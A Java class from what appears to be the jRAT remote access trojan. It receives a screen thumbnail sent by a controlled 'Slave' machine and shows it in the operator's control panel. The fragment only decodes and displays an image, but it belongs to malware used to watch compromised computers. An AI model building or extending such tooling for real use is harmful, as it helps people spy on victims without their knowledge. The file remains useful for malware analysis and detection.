package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.Frame;
import io.jrat.client.utils.Utils;

import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.DataInputStream;

import javax.swing.ImageIcon;


public class Packet33Thumbnail extends AbstractIncomingPacket {

	private BufferedImage bufferedImage;

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		bufferedImage = new BufferedImage(150, 100, BufferedImage.TYPE_3BYTE_BGR);
		byte[] buffer = ((DataBufferByte) bufferedImage.getRaster().getDataBuffer()).getData();

		slave.getDataInputStream().readFully(buffer);

		slave.setThumbnail(new ImageIcon(bufferedImage));

		int row = Utils.getRow(slave);

		if (row != -1 && Frame.thumbnails) {
			Frame.mainModel.setValueAt(slave.getThumbnail(), row, 0);
		}
	}

}
